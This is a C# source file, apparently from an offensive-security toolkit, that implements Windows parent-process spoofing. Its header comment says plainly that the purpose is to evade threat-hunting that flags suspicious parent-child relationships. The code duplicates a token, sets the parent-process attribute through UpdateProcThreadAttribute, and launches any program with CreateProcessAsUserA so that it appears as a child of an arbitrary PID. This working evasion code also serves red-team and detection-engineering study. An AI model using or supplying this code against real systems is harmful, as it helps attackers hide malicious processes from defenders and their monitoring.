using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Foster
{
    /// <summary>
    /// If you have permissions, you can start a new process as a child process of another process. This 
    /// can be valuable for evading threat-hunting mechanisms that check for suspicious parent-child relationships
    /// such as cmd.exe being a child of an unknown process. 
    /// </summary>
    static class Foster
    {
        /// <summary>
        /// Starts a specified program as a child process of a specified PID
        /// </summary>
        /// <param name="Application">Executable process to start. This can be left empty if the application is specified as part of the CommandLineArgs parameter.</param>
        /// <param name="CommandLineArgs">Optionally specifiy command line arguments to pass to the Application.</param>
        /// <param name="Pid">The PID of the parent process.</param>
        /// <returns>Handle for created process. If IntPtr.Zero, then it failed to create it.</returns>
        public static IntPtr StartProcessWithParent(string Application, string CommandLineArgs, int Pid)
        {
            var proc = Process.GetProcessById(Pid).Handle;
            return StartProcessAsUser(Application, CommandLineArgs, null, true, proc);
        }

        /// <summary>
        /// Starts a specified program as a child process of a specified process handle. 
        /// </summary>
        /// <param name="szFile">Application to run</param>
        /// <param name="szArguments">Arguments for the specified Application</param>
        /// <param name="szDirectory">Current working directory for application (can be null)</param>
        /// <param name="Inherit">If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. 
        /// If the parameter is FALSE, the handles are not inherited. Note that inherited handles have the same value and access rights as the original handles.</param>
        /// <param name="hParent">Handle for parent process</param>
        /// <returns></returns>
        private static IntPtr StartProcessAsUser(string szFile, string szArguments, string szDirectory, bool Inherit, IntPtr hParent)
        {
            var startupInfo = new WinApi.STARTUPINFOEX();
            var procInfo = new WinApi.PROCESS_INFORMATION();
            var secAttr = new WinApi.SECURITY_ATTRIBUTES();
            var processToken = IntPtr.Zero;
            var cbAttributeListSize = IntPtr.Zero;

            WinApi.OpenProcessToken(new IntPtr(-1), (uint)WinApi.TOKEN_ACCESS.TOKEN_ALL_ACCESS, ref processToken);
            WinApi.DuplicateTokenEx(processToken, (uint)WinApi.TOKEN_ACCESS.TOKEN_ALL_ACCESS, out secAttr, WinApi.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WinApi.TOKEN_TYPE.TokenPrimary, out IntPtr userToken);
            WinApi.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref cbAttributeListSize);

            IntPtr pAttributeList = WinApi.VirtualAlloc(IntPtr.Zero, (int)cbAttributeListSize, 0x1000, 0x40);
            WinApi.InitializeProcThreadAttributeList(pAttributeList, 1, 0, ref cbAttributeListSize);
            WinApi.UpdateProcThreadAttribute(pAttributeList, 0, (IntPtr)0x00020000, ref hParent, (IntPtr)Marshal.SizeOf(hParent), IntPtr.Zero, IntPtr.Zero);

            startupInfo.lpAttributeList = pAttributeList;
            startupInfo.StartupInfo = new WinApi.STARTUPINFO();

            WinApi.CreateProcessAsUserA(userToken, szFile, szArguments, IntPtr.Zero, IntPtr.Zero, Inherit, 0x400 | 0x010 | 0x00080000, IntPtr.Zero, szDirectory, ref startupInfo, ref procInfo);

            WinApi.CloseHandle(processToken);
            WinApi.CloseHandle(userToken);
            WinApi.DeleteProcThreadAttributeList(pAttributeList);
            WinApi.VirtualFree(pAttributeList, 0x1000, 0x8000);

            return procInfo.hProcess;
        }
    }
}
